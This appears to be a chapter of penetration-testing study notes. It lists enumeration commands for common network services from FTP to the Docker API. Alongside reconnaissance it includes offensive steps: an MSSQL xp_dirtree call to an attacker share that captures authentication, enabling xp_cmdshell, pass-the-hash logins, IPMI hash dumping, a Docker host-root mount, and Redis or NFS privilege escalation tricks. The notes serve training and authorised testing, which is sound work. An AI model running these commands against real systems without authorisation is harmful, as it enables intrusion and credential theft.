# 11 — Footprinting

Service-by-service enumeration. After [10 Nmap](10-network-enumeration-with-nmap.md) tells you what is open, this module is what you do next, port by port.

## Contents

- [FTP — 21/tcp (and 20 for data)](#ftp-21tcp-and-20-for-data)
- [SSH — 22/tcp](#ssh-22tcp)
- [Telnet — 23/tcp](#telnet-23tcp)
- [SMTP — 25, 465 (SMTPS), 587 (submission)](#smtp-25-465-smtps-587-submission)
- [DNS — 53/tcp+udp](#dns-53tcpudp)
- [Finger — 79/tcp](#finger-79tcp)
- [HTTP / HTTPS — 80, 443, 8000-9000, etc.](#http-https-80-443-8000-9000-etc)
- [POP3 / IMAP — 110, 143, 993 (S), 995 (S)](#pop3-imap-110-143-993-s-995-s)
- [RPCbind / portmapper — 111](#rpcbind-portmapper-111)
- [NTP — 123/udp](#ntp-123udp)
- [NetBIOS / SMB — 137/138/139, 445](#netbios-smb-137138139-445)
- [SNMP — 161/162 udp](#snmp-161162-udp)
- [LDAP — 389, 636, 3268/3269 (Global Catalog)](#ldap-389-636-32683269-global-catalog)
- [NFS — 2049](#nfs-2049)
- [MySQL / MariaDB — 3306](#mysql-mariadb-3306)
- [MSSQL — 1433 (and 1434/udp browser)](#mssql-1433-and-1434udp-browser)
- [Oracle TNS — 1521](#oracle-tns-1521)
- [IPMI — 623/udp](#ipmi-623udp)
- [RDP — 3389](#rdp-3389)
- [WinRM — 5985 (HTTP), 5986 (HTTPS)](#winrm-5985-http-5986-https)
- [VNC — 5900-5906](#vnc-5900-5906)
- [Redis — 6379](#redis-6379)
- [Memcached — 11211](#memcached-11211)
- [Elasticsearch — 9200/9300](#elasticsearch-92009300)
- [MongoDB — 27017](#mongodb-27017)
- [Docker API — 2375/2376](#docker-api-23752376)
- [Generic last-mile](#generic-last-mile)
- [Sources](#sources)

## FTP — 21/tcp (and 20 for data)

```bash
# Banner / anon
nmap -p21 -sCV --script ftp-anon,ftp-syst,ftp-bounce <T>

# Interactive
ftp <T>           # try anonymous / anonymous

# lftp (better for scripting and TLS)
lftp -u anonymous, ftp://<T>

# Recursive download
wget -r ftp://anonymous:@<T>/

# Bounce scan (rare; legacy)
nmap -b anonymous:@<T> <internal>
```

Look for: anonymous read, anonymous upload, world-readable config/backup files, mis-set chroot.

## SSH — 22/tcp

```bash
nmap -p22 -sCV --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey <T>

ssh -v user@<T>
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no user@<T>
ssh -i id_rsa user@<T>

# User enumeration via timing on old OpenSSH (< 7.7)
# Use historical PoCs sparingly; modern OpenSSH is patched.
```

Audit weak crypto / config:

```bash
ssh-audit <T>
```

## Telnet — 23/tcp

```bash
nmap -p23 -sCV --script telnet-encryption,telnet-ntlm-info <T>
telnet <T> 23
```

Banner often discloses platform (network device, embedded). Default creds territory.

## SMTP — 25, 465 (SMTPS), 587 (submission)

```bash
nmap -p25,465,587 -sCV --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 <T>

# Banner
nc -nv <T> 25

# User enumeration
VRFY root
EXPN postmaster
RCPT TO:<root@target>           # MAIL FROM first

# Tooling
smtp-user-enum -M VRFY -U users.txt -t <T>
smtp-user-enum -M RCPT -U users.txt -D <domain> -t <T>
```

Open relay test: `MAIL FROM:<a@external>` followed by `RCPT TO:<b@external>` — if accepted, relay is open.

## DNS — 53/tcp+udp

```bash
# Records
dig <domain> ANY @<NS>
dig +short -x <ip>                          # PTR
dig SRV _ldap._tcp.dc._msdcs.<domain> @<DC> # AD discovery

# Zone transfer
dig AXFR <domain> @<NS>
host -l <domain> <NS>
fierce --domain <domain>

# Subdomain brute (if no zone xfer)
dnsenum <domain>
amass enum -d <domain>
subfinder -d <domain> -all -recursive
gobuster dns -d <domain> -w subdomains.txt
puredns bruteforce wordlist.txt <domain>

# Reverse range
dnsrecon -r 10.10.10.0/24
```

## Finger — 79/tcp

```bash
finger @<T>
finger root@<T>
finger-user-enum.pl -U users.txt -t <T>
```

## HTTP / HTTPS — 80, 443, 8000-9000, etc.

See [12 Information Gathering – Web Edition](12-information-gathering-web.md) and [21 Web Proxies](21-using-web-proxies.md).

Quick fingerprint:

```bash
whatweb -a 3 https://<T>
curl -sI https://<T>
curl -sk https://<T> | grep -iE 'generator|powered|version'
nuclei -u https://<T> -t http/technologies/
```

## POP3 / IMAP — 110, 143, 993 (S), 995 (S)

```bash
nmap -p110,143,993,995 -sCV --script pop3-capabilities,pop3-ntlm-info,imap-capabilities,imap-ntlm-info <T>

# Manual
nc <T> 110
USER alice
PASS Pass1
LIST
RETR 1
QUIT
```

`pop3-ntlm-info` / `imap-ntlm-info` leak the AD domain/hostname/version — useful even without creds.

## RPCbind / portmapper — 111

```bash
rpcinfo -p <T>
nmap -p111 --script rpcinfo,nfs-* <T>
```

If `nfs` is mapped, jump to NFS section below.

## NTP — 123/udp

```bash
ntpq -c 'rv 0' <T>
ntpdc -c monlist <T>           # legacy amplification check
nmap -sU -p123 --script ntp-info,ntp-monlist <T>
```

## NetBIOS / SMB — 137/138/139, 445

```bash
# Quick
nbtscan <T> / nbtscan -r 10.10.10.0/24
nmap -p139,445 -sCV --script "smb-os-discovery,smb-enum-shares,smb-enum-users,smb-protocols,smb2-security-mode,smb-vuln-*" <T>

# Shares & sessions
smbclient -L //<T> -N                            # null session
smbclient -L //<T> -U 'corp\alice%Pass1'
smbclient //<T>/share -N

# NetExec (replaces crackmapexec)
netexec smb <T>
netexec smb <T> -u alice -p Pass1 --shares
netexec smb <T> -u alice -p Pass1 --users --groups --pass-pol
netexec smb <T> -u alice -p Pass1 --rid-brute
netexec smb <T> -u '' -p '' --shares             # null
netexec smb <T> -u guest -p '' --shares          # guest

# Impacket
impacket-smbmap -H <T> -u alice -p Pass1
impacket-lookupsid alice:Pass1@<T>
impacket-rpcdump <T> | grep -i "Mailslot"
```

Look for: null/guest sessions, world-writable shares, `IPC$` info leaks, anonymous RID enumeration.

## SNMP — 161/162 udp

```bash
nmap -sU -p161 --script snmp-info,snmp-interfaces,snmp-processes,snmp-netstat,snmp-sysdescr,snmp-win32-services,snmp-win32-users <T>

onesixtyone -c communities.txt <T>
snmpwalk -v2c -c public <T>
snmpwalk -v2c -c public <T> 1.3.6.1.2.1.1            # system
snmpwalk -v1 -c public <T> 1.3.6.1.4.1.77.1.2.25     # Windows users
snmpwalk -v2c -c public <T> 1.3.6.1.2.1.25.4.2.1.2   # Windows processes
snmpwalk -v2c -c public <T> 1.3.6.1.4.1.77.1.4.1     # Windows shares
snmp-check <T> -c public
```

Common community strings: `public`, `private`, `community`, `manager`, `internal`. SNMPv3 needs creds; v1/v2c accept any string the device is configured for.

## LDAP — 389, 636, 3268/3269 (Global Catalog)

```bash
# Anonymous bind / RootDSE
ldapsearch -x -H ldap://<DC> -s base -b "" "(objectClass=*)"

# Authenticated
ldapsearch -x -H ldap://<DC> -D 'corp\alice' -w Pass1 \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf

# Quick enum
nmap -p389,636,3268,3269 --script "ldap-rootdse,ldap-search" <T>
windapsearch -d corp.local --dc-ip <DC> -u alice -p Pass1 -m users
ldapdomaindump -u 'corp\alice' -p Pass1 ldap://<DC>
```

Useful filters: see [07 Intro AD](07-introduction-to-active-directory.md).

## NFS — 2049

```bash
showmount -e <T>                             # exports
mount -t nfs <T>:/export /mnt/nfs -o nolock
nmap -p2049 --script nfs-ls,nfs-showmount,nfs-statfs <T>
```

UID/GID-based ACL — if `no_root_squash` is set on an export, mount it, drop a SUID `bash` as root, regain root on the target.

## MySQL / MariaDB — 3306

```bash
nmap -p3306 -sCV --script "mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables,mysql-vuln-cve2012-2122" <T>

mysql -h <T> -u root -p
mysql -h <T> -u root --password=''             # empty
mysql -h <T> -u root -e 'show databases;'
```

Once in: `\\!system <cmd>` (Linux mysql client only), `LOAD DATA LOCAL INFILE`, `INTO OUTFILE`, UDF abuse.

## MSSQL — 1433 (and 1434/udp browser)

```bash
nmap -p1433 -sCV --script "ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-dump-hashes,ms-sql-xp-cmdshell" <T>
nmap -sU -p1434 --script ms-sql-discover <T>

# Impacket
impacket-mssqlclient corp/alice:Pass1@<T> -windows-auth
impacket-mssqlclient sa:Pass1@<T>

# Inside the SQL client
SELECT @@version;
EXEC xp_dirtree '\\\\attacker\\share';   -- coerce auth (SMB capture)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# NetExec
netexec mssql <T> -u sa -p Pass1 -x 'whoami /all'
```

Linked servers: `EXEC sp_linkedservers;` — pivot via `OPENQUERY()`.

## Oracle TNS — 1521

```bash
nmap -p1521 --script "oracle-sid-brute,oracle-tns-version" <T>
odat all -s <T>
odat sidguesser -s <T>
odat passwordguesser -s <T> -d <SID> -U users.txt -P passwords.txt
```

## IPMI — 623/udp

```bash
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero <T>

# Cipher 0: any password works if accepted (CVE-2013-4786 family).
# Hash dump (RAKP):
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <T>; run; exit"
hashcat -m 7300 hashes.txt rockyou.txt
```

## RDP — 3389

```bash
nmap -p3389 -sCV --script "rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020" <T>

# NetExec
netexec rdp <T> -u alice -p Pass1
netexec rdp <T> -u users.txt -p 'Password1' --continue-on-success

# Connect
xfreerdp /u:alice /d:corp /p:Pass1 /v:<T> /dynamic-resolution /drive:share,/tmp
xfreerdp /u:alice /d:corp /pth:<NThash> /v:<T>     # pass-the-hash
```

## WinRM — 5985 (HTTP), 5986 (HTTPS)

```bash
nmap -p5985,5986 -sV <T>
netexec winrm <T> -u alice -p Pass1
evil-winrm -i <T> -u alice -p Pass1
evil-winrm -i <T> -u alice -H <NThash>            # pass-the-hash
```

WinRM access requires `Remote Management Users` (or admin). Stealthy compared to RDP.

## VNC — 5900-5906

```bash
nmap -p5900-5906 -sCV --script "vnc-info,vnc-title,realvnc-auth-bypass" <T>
vncviewer <T>
```

Old RealVNC has CVE-2006-2369 (auth bypass). Stored configs sometimes leak unencrypted passwords (VNC password hashing key is constant: `0xE84AD660C4721AE0`).

## Redis — 6379

```bash
nmap -p6379 --script redis-info <T>
redis-cli -h <T>
> INFO
> CONFIG GET *
> KEYS *
```

Unauth Redis → file write via `CONFIG SET dir / dbfilename` + `SAVE` (classic SSH key planting / web-shell writing).

## Memcached — 11211

```bash
nmap -p11211 --script memcached-info <T>
echo -e 'stats\r\nquit\r\n' | nc <T> 11211
memcdump --servers=<T>
```

## Elasticsearch — 9200/9300

```bash
curl http://<T>:9200/
curl http://<T>:9200/_cat/indices?v
curl http://<T>:9200/<index>/_search?pretty
```

Old (< 5.x) had script-engine RCE; modern versions usually require auth/x-pack.

## MongoDB — 27017

```bash
nmap -p27017 --script mongodb-info,mongodb-databases <T>
mongo --host <T>
> show dbs
> use <db>; show collections; db.<col>.find().pretty()
```

## Docker API — 2375/2376

```bash
curl http://<T>:2375/info
docker -H tcp://<T>:2375 ps
docker -H tcp://<T>:2375 run -v /:/host -it alpine chroot /host sh
```

Unauth Docker API == root on the host.

## Generic last-mile

For anything unusual, in this order:

1. `nmap -sV -sC` — banner + default scripts.
2. `searchsploit <product> <version>` — known vulns.
3. `nuclei -u ...` for templates.
4. Read official docs: most "exotic" services have a documented enumeration path.
5. `tcpdump`/Wireshark a known client interaction to learn the protocol.

## Sources

- Nmap NSE: https://nmap.org/nsedoc/
- HackTricks (Pentesting Network): https://book.hacktricks.wiki/en/network-services-pentesting/
- The Hacker Recipes: https://www.thehacker.recipes/
- Tool man pages: smbclient, snmpwalk, ldapsearch, redis-cli, mongo, etc.
